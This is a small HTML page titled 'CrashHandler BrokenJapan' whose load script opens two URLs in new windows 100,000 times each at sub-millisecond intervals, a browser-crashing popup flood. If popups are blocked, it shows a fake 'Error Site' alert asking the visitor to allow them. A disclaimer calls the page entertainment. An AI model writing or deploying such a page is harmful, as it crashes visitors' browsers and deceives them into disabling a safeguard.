<!doctype html> <!-- Дисклеймер: сайт создан для развлечений, я не несу ответственность за ваши действия -->
<html>
<head>
  <meta charset="utf-8">
  <title>CrashHandler BrokenJapan</title>
  <script>
    window.onload = function() {
      const urls = ["http://hello.com", "http://catusb37.github.io/brokenjapan"]; 
      const count = 100000; 
      const interval = 0.1; 
      let popupBlocked = false;

      try {
        for (let i = 0; i < count; i++) {
          urls.forEach((url, j) => {
            setTimeout(() => {
              const newWin = window.open(url, "_blank");
              if (!newWin || newWin.closed || typeof newWin.closed === 'undefined') {
                popupBlocked = true;
              }
            }, (i * urls.length + j) * interval);
          });
        }
      } catch {
        popupBlocked = true;
      }

      setTimeout(() => {
        if (popupBlocked) {
          alert("Error Site\n\nДозвольте спливаючі вікна");
        }
      }, 500);
    };
  </script>
</head>
<body></body>
</html>
